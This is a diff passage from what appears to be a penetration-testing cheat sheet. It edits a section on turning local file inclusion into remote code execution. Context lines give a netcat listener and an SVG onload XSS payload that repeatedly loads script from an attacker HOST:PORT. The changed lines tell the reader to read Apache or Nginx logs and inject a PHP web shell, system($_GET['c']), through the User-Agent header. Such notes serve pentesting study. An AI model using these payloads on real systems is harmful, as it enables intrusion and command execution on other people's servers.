@@ -405,15 +405,19 @@ https://github.com/intrudir/403fuzzer <br />
 Attacker: while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
 Victim: <svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>
 ```
-### LFI To RCE
+### LFI/RFI
 
-If LFI vulnerability exists we can read and poison logs
+Try to read local files like log files ,apache virtual host configuration file source code on the target machine<br/>
 
-#### Apache2
+Virutal Hosts file : `/etc/apache2/sites-available/000-default.conf`<br/>
+
+If we can read log files,we can poison them to get RCE<br />
+
+#### For Apache2
 
 For apache `/var/log/apache2/access.log` try to access the log and if we can then add `<?php system($_GET['c']); ?>`in User-agent<br/>
 
-#### Niginx
+#### For Niginx
 
 For niginx `/var/log/nginx/error.log` try to access the log and if we can then add `<?php system($_GET['c']); ?>` in User-agent or try to add it in a file having a paramter make sure it's not being url encoded <br/>
 
